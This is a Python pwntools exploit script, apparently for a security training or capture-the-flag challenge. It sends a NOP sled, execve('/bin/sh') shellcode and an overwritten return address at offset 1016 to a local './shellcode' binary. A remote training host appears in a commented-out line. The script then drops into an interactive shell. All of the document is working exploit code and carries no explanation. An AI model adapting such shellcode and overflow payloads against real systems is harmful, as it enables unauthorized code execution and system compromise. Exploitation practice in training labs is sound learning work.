import pwn

pwn.context.terminal = ['gnome-terminal', '-e']

shell_code = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

# r = pwn.remote('training.jinblack.it', 2001)

r = pwn.process('./shellcode')

pwn.gdb.attach(r, """c

""")

input()

buf = r.recvuntil('name?\n')

print(buf)

buffer_addr = 0x00601080

offset = 1016
nop_sled = b'\x90' * (offset - len(shell_code))

exploit = nop_sled + shell_code + pwn.p64(buffer_addr)

r.send(exploit)

r.interactive()